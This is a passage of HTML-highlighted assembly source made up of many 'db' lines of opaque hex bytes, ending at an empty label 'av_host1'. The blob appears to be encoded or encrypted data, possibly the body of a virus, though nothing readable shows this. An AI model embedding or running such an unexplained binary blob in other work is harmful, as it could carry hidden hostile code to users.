   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">0e6h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">00eh</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc4">,</span><span class="sc2">092h</span><span class="sc4">,</span><span class="sc2">091h</span><span class="sc4">,</span><span class="sc2">094h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">01eh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">0bch</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c8h</span><span class="sc4">,</span><span class="sc2">0d7h</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">03bh</span><span class="sc4">,</span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">035h</span><span class="sc4">,</span><span class="sc2">05bh</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">0a1h</span><span class="sc4">,</span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">09bh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">0cbh</span><span class="sc4">,</span><span class="sc2">093h</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">089h</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">0f9h</span><span class="sc4">,</span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">0cbh</span><span class="sc4">,</span><span class="sc2">086h</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc2">05bh</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc4">,</span><span class="sc2">0e7h</span><span class="sc4">,</span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc4">,</span><span class="sc2">01eh</span><span class="sc4">,</span><span class="sc2">02ah</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">0c5h</span><span class="sc4">,</span><span class="sc2">0ech</span><span class="sc4">,</span><span class="sc2">08ah</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc2">0f1h</span><span class="sc4">,</span><span class="sc2">085h</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">051h</span><span class="sc4">,</span><span class="sc2">09dh</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc4">,</span><span class="sc2">0cfh</span><span class="sc4">,</span><span class="sc2">0bch</span><span class="sc4">,</span><span class="sc2">091h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc2">08fh</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">0e1h</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">0e1h</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">0e3h</span><span class="sc4">,</span><span class="sc2">0dch</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">0a1h</span><span class="sc4">,</span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">06ah</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">0f3h</span><span class="sc4">,</span><span class="sc2">0cfh</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">00dh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">035h</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc4">,</span><span class="sc2">027h</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc4">,</span><span class="sc2">0cah</span><span class="sc4">,</span><span class="sc2">011h</span><span class="sc4">,</span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0a1h</span><span class="sc4">,</span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">09bh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">0f9h</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">017h</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">01dh</span><span class="sc4">,</span><span class="sc2">0e4h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc2">091h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">058h</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">0dah</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">0fch</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">02fh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">085h</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">0a1h</span><span class="sc4">,</span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">095h</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">03ch</span><span class="sc4">,</span><span class="sc2">0a8h</span><span class="sc4">,</span><span class="sc2">0a4h</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">0cbh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">01eh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">0bch</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc4">,</span><span class="sc2">01eh</span><span class="sc4">,</span><span class="sc2">02ah</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">037h</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">0cah</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc2">015h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">014h</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cfh</span><span class="sc4">,</span><span class="sc2">0e6h</span><span class="sc4">,</span><span class="sc2">07bh</span><span class="sc4">,</span><span class="sc2">059h</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc2">0f1h</span><span class="sc4">,</span><span class="sc2">085h</span><span class="sc4">,</span><span class="sc2">0d5h</span><span class="sc4">,</span><span class="sc2">0f1h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">01dh</span><span class="sc4">,</span><span class="sc2">03dh</span><span class="sc4">,</span><span class="sc2">0cbh</span><span class="sc4">,</span><span class="sc2">059h</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc2">04ah</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">09ch</span><span class="sc4">,</span><span class="sc2">0c7h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc2">011h</span><span class="sc4">,</span><span class="sc2">03bh</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc2">096h</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc2">096h</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">06bh</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc2">0d9h</span><span class="sc4">,</span><span class="sc2">0e5h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">0d6h</span><span class="sc4">,</span><span class="sc2">08ah</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">0e6h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">071h</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">05ah</span><span class="sc4">,</span><span class="sc2">0b5h</span><span class="sc4">,</span><span class="sc2">037h</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc2">0e3h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">051h</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">0fch</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">02fh</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">0c5h</span><span class="sc4">,</span><span class="sc2">01dh</span><span class="sc4">,</span><span class="sc2">00bh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc4">,</span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc2">09eh</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc4">,</span><span class="sc2">0cah</span><span class="sc4">,</span><span class="sc2">0d7h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">0cah</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">08ch</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">0dah</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">098h</span><span class="sc4">,</span><span class="sc2">0cbh</span><span class="sc4">,</span><span class="sc2">01ah</span><span class="sc4">,</span><span class="sc2">04fh</span><span class="sc4">,</span><span class="sc2">00ch</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc4">,</span><span class="sc2">0cah</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cbh</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">014h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">09ah</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc4">,</span><span class="sc2">0cah</span><span class="sc4">,</span><span class="sc2">0d6h</span><span class="sc4">,</span><span class="sc2">0d5h</span><span class="sc4">,</span><span class="sc2">01ch</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cfh</span><span class="sc4">,</span><span class="sc2">099h</span><span class="sc4">,</span><span class="sc2">0d5h</span><span class="sc4">,</span><span class="sc2">03dh</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc2">092h</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cbh</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">014h</span><span class="sc4">,</span><span class="sc2">0d5h</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc2">019h</span><span class="sc4">,</span><span class="sc2">03ah</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">0eeh</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">0d3h</span><span class="sc4">,</span><span class="sc2">07bh</span><span class="sc4">,</span><span class="sc2">00ch</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cbh</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">014h</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc2">0a2h</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">013h</span><span class="sc4">,</span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc2">095h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">034h</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">034h</span><span class="sc4">,</span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">049h</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">012h</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">013h</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc4">,</span><span class="sc2">0cah</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">08dh</span><span class="sc4">,</span><span class="sc2">0cah</span><span class="sc4">,</span><span class="sc2">0d7h</span><span class="sc4">,</span><span class="sc2">00ch</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc4">,</span><span class="sc2">0cah</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0e4h</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">0deh</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc2">017h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cfh</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc2">0cfh</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc2">066h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">00ch</span><span class="sc4">,</span><span class="sc2">0cfh</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0e4h</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0e4h</span><span class="sc4">,</span><span class="sc2">0e7h</span><span class="sc4">,</span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0e4h</span><span class="sc4">,</span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">032h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0e4h</span><span class="sc4">,</span><span class="sc2">0e7h</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0e4h</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc4">,</span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc2">09eh</span><span class="sc4">,</span><span class="sc2">099h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">029h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc2">086h</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">0a1h</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc4">,</span><span class="sc2">01ah</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc2">0fch</span><span class="sc4">,</span><span class="sc2">02dh</span><span class="sc4">,</span><span class="sc2">0a6h</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc4">,</span><span class="sc2">095h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">0e3h</span><span class="sc4">,</span><span class="sc2">0a8h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc2">02ah</span><span class="sc4">,</span><span class="sc2">0a8h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">05fh</span><span class="sc4">,</span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc2">0f1h</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc2">096h</span><span class="sc4">,</span><span class="sc2">071h</span><span class="sc4">,</span><span class="sc2">0a8h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc2">02ah</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc4">,</span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc2">068h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0a1h</span><span class="sc4">,</span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">06ah</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc2">096h</span><span class="sc4">,</span><span class="sc2">071h</span><span class="sc0">

   </span><span class="sc5">av_host1</span><span class="sc4">:</span><span class="sc0">

